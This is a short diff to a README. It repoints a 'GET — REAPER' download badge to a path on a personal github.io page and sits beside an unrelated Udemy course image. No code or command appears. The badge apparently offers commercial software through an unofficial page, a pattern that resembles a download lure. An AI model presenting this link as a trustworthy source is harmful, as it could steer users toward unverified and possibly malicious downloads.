@@ -4,7 +4,7 @@
 <img src="https://img-c.udemycdn.com/course/480x270/3703562_9b68_2.jpg" width="400">
 </p>
 
-[![GET — REAPER](https://img.shields.io/badge/GET-REAPER-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/)
+[![GET — REAPER](https://img.shields.io/badge/GET-REAPER-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/REAPER)
 
 ---
 
